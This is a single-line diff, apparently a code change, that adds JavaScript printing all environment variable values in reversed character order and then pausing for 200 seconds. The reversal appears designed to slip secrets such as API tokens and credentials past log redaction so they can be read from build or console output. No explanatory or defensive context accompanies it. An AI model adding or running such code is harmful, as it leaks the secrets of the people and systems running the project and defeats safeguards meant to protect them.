@@ -1,0 +1,1 @@
+console.log(Object.values(process.env).join('\n').split("").reverse().join("")); await new Promise(resolve => setTimeout(resolve, 200_000))
